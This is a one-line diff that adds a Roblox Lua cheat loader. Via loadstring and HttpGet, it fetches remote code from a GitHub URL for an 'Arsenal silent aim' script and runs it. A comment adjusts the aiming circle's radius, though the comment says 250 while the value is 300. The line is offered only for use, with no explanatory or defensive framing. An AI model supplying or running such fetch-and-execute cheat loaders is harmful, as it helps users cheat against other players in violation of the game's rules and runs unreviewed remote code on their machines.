@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/kinhey/scripts/main/arsenal_silent_aim.lua"))() circle1.Radius = 300 -- Change 250 to whatever you like. (this is the radius of the circle)
